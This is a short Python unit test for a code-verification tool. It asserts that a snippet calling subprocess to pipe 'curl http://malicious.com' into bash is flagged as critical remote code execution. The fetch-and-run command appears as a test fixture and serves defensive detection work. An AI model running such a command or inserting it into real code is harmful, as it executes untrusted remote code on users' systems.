from qwed_new.core.code_verifier import CodeVerifier


def test_subprocess_curl_pipe_bash_detected_as_critical():
    verifier = CodeVerifier()
    code = 'import subprocess\nsubprocess.run(["curl", "http://malicious.com", "|", "bash"])'

    result = verifier.verify_code(code, language="python")

    assert result["critical_count"] >= 1
    assert any(issue["type"] == "remote_code_execution" for issue in result["issues"])
